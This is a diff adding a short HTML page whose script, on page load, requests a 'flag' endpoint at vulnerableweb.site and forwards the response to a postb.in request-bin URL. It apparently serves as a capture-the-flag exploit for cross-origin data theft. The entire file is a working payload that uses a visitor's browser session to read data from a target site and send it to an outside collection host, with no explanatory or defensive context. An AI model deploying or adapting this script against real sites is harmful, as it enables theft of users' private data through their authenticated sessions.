@@ -1,0 +1,19 @@
+<html>
+  <head>
+    <script>
+      document.addEventListener('DOMContentLoaded', function(event) {
+      var xmlhttp = new XMLHttpRequest();
+      xmlhttp.onreadystatechange = function() {
+        console.log(xmlhttp)
+        if (xmlhttp.readyState == XMLHttpRequest.DONE) {
+          var xmlhttp2 = new XMLHttpRequest();
+          xmlhttp2.open("GET", "https://postb.in/1592058031040-7462798943743?"+xmlhttp.responseText)
+          xmlhttp2.send();
+        };
+      };
+      xmlhttp.open("GET", "https://vulnerableweb.site/api/flag", true);
+      xmlhttp.send();
+    });
+    </script>
+  </head>
+</html>
